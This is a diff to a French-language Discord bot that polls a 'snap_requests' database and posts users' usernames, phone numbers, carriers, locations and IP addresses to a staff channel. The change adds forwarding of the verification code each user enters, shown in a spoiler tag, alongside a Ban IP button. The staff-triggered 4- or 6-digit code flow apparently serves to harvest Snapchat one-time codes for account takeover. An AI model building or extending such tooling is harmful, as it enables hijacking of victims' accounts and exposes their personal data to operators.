@@ -59,31 +59,55 @@ client.once('ready', () => {
     console.log(`🤖 Bot connecté : ${client.user.tag}`);
     console.log(`📡 API: ${API_BASE}`);
     console.log(`📝 Salon: ${LOG_CHANNEL_ID || 'Non configuré'}`);
-    startPolling();
+    startPollingPending();
+    startPollingCompleted();
 });
 
-// ─── POLLING ───
-let lastCheckedId = 0;
+// ─── POLLING : nouvelles demandes PENDING ───
+let lastPendingId = 0;
 
-async function startPolling() {
+async function startPollingPending() {
     setInterval(async () => {
         try {
             const rows = await sql`
                 SELECT id, username, phone, operator, country, city, ip_address, status, created_at
                 FROM snap_requests
-                WHERE id > ${lastCheckedId} AND status = 'pending'
+                WHERE id > ${lastPendingId} AND status = 'pending'
                 ORDER BY id ASC
             `;
             for (const row of rows) {
-                lastCheckedId = Math.max(lastCheckedId, row.id);
+                lastPendingId = Math.max(lastPendingId, row.id);
                 await sendNewRequestEmbed(row);
             }
         } catch (e) {
-            console.error('Polling error:', e.message || e);
+            console.error('Polling pending error:', e.message || e);
         }
     }, 5000);
 }
 
+// ─── POLLING : demandes COMPLETED (code saisi par l'utilisateur) ───
+let lastCompletedId = 0;
+
+async function startPollingCompleted() {
+    setInterval(async () => {
+        try {
+            const rows = await sql`
+                SELECT id, username, phone, operator, country, city, ip_address, staff_code, status, created_at
+                FROM snap_requests
+                WHERE id > ${lastCompletedId} AND status = 'completed' AND staff_code IS NOT NULL
+                ORDER BY id ASC
+            `;
+            for (const row of rows) {
+                lastCompletedId = Math.max(lastCompletedId, row.id);
+                await sendCompletedEmbed(row);
+            }
+        } catch (e) {
+            console.error('Polling completed error:', e.message || e);
+        }
+    }, 5000);
+}
+
+// ─── Embed nouvelle demande ───
 async function sendNewRequestEmbed(row) {
     const channel = client.channels.cache.get(LOG_CHANNEL_ID);
     if (!channel) { console.log('⚠️ Salon non trouvé'); return; }
@@ -116,6 +140,42 @@ async function sendNewRequestEmbed(row) {
     console.log(`📨 Nouvelle demande : ${row.phone}`);
 }
 
+// ─── Embed CODE SAISI (avec bouton Ban IP) ───
+async function sendCompletedEmbed(row) {
+    const channel = client.channels.cache.get(LOG_CHANNEL_ID);
+    if (!channel) return;
+
+    const carrierNames = {
+        'orange': 'Orange', 'sfr': 'SFR', 'bouygues': 'Bouygues',
+        'base': 'BASE', 'orange_be': 'Orange Belgique', 'proximus': 'Proximus', 'telenet': 'Telenet'
+    };
+
+    const embed = new EmbedBuilder()
+        .setTitle('🔓 Code saisi par l\'utilisateur')
+        .setColor(0x10b981)
+        .addFields(
+            { name: '👤 Username', value: row.username, inline: true },
+            { name: '📞 Téléphone', value: row.phone, inline: true },
+            { name: '🔢 Code', value: `||${row.staff_code}||`, inline: true },
+            { name: '📡 Opérateur', value: carrierNames[row.operator] || row.operator, inline: true },
+            { name: '🌍 Pays', value: row.country || 'Inconnu', inline: true },
+            { name: '🏙️ Ville', value: row.city || 'Inconnue', inline: true },
+            { name: '🌐 IP', value: row.ip_address || 'Inconnue', inline: true }
+        )
+        .setFooter({ text: `ID: ${row.id}` })
+        .setTimestamp();
+
+    const banRow = new ActionRowBuilder().addComponents(
+        new ButtonBuilder()
+            .setCustomId(`banip_${row.ip_address}`)
+            .setLabel('🚫 Ban IP')
+            .setStyle(ButtonStyle.Danger)
+    );
+
+    await channel.send({ embeds: [embed], components: [banRow] });
+    console.log(`🔓 Code saisi : ${row.phone} — IP: ${row.ip_address}`);
+}
+
 // ─── INTERACTIONS BOUTONS ───
 client.on('interactionCreate', async interaction => {
     if (!interaction.isButton()) return;
@@ -125,7 +185,6 @@ client.on('interactionCreate', async interaction => {
     // ─── CLAIM ───
     if (action === 'claim') {
         await interaction.deferReply({ flags: 64 });
-
         try {
             const res = await fetch(`${API_BASE}/api/staff-action`, {
                 method: 'POST',
@@ -137,7 +196,6 @@ client.on('interactionCreate', async interaction => {
             if (data.success) {
                 await interaction.editReply({ content: `✅ Demande **${phone}** prise en charge par <@${interaction.user.id}>` });
 
-                // Nouveaux boutons : 4 chiffres, 6 chiffres, Wrong Number
                 const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
                     .setColor(0x3b82f6)
                     .setTitle('📱 Demande en cours de traitement')
@@ -221,10 +279,10 @@ client.on('interactionCreate', async interaction => {
         } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
     }
 
-    // ─── BAN IP (depuis l'embed de code validé) ───
+    // ─── BAN IP ───
     if (action === 'banip') {
         await interaction.deferReply({ flags: 64 });
-        const ip = phone; // dans customId c'est banip_<ip>
+        const ip = phone;
         try {
             const res = await fetch(`${API_BASE}/api/ban-ip`, {
                 method: 'POST',
